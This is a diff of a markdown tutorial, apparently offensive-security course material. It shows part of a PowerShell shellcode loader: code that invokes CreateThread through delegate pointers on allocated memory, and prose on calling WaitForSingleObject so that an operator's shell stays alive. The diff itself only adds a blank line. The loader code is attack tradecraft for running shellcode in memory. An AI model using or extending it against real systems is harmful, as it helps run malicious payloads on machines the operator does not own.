@@ -177,6 +177,7 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 ```
 ---
+
 Completing the Shellcode Loader
 ---
 The final piece of the shellcode loader consists of locating and calling the WaitForSingleObject API from kernel32.dll. Calling this function with the appropriate arguments will ensure that the shell will not instanteniously terminate and only stop when the shell is terminated by the operator. This part is left as an exercise.
